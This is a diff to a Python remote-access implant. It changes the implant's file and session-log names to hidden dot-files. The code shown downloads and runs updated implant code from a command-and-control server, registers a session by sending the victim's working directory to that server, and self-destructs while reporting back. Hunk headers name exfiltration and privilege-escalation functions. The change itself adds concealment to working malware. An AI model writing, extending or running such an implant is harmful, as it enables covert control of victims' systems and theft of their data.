@@ -18,13 +18,13 @@ def ExfilFile(file, c2, IPAddress):
 #This will download the new version of the implant, and then run it as a subprocess.
 def UpdateImplant(implantDir):
     os.chdir(implantDir)
-    urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', f'{implantDir}/implant.py')
-    subprocess.Popen([sys.executable, f'{implantDir}/implant.py'])
+    urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', f'{implantDir}/.implant.py')
+    subprocess.Popen([sys.executable, f'{implantDir}/.implant.py'])
     return
 
 #This will self destruct our implant.
 def SelfDestruct(implantDir):
-    os.system(f'rm {implantDir}/sid.log; rm {implantDir}/implant.py')
+    os.system(f'rm {implantDir}/.sid.log; rm {implantDir}/.implant.py')
     destructMsg = urllib.parse.quote_plus("Implant has self destructed")
     urllib.request.urlopen(f'{c2}/info?info={destructMsg}&sid={sid}')
     return
@@ -74,14 +74,14 @@ def PrivEsc(implantDir):
     return
 
 #initialiazation, this will set establish a Session ID
-if(os.path.isfile("sid.log")):
-    sid = open('sid.log', "r").read()
+if(os.path.isfile(".sid.log")):
+    sid = open('.sid.log', "r").read()
     dir = urllib.parse.quote_plus(os.getcwd())
     urllib.request.urlopen(f'{c2}/reconnect?sid={sid}&cwd={dir}')
 else:
     dir = urllib.parse.quote_plus(os.getcwd())
     sid = urllib.request.urlopen(f'{c2}/?cwd={dir}').read().decode("utf-8")
-    f = open("sid.log", "w")
+    f = open(".sid.log", "w")
     f.write(sid)
     f.close()
 
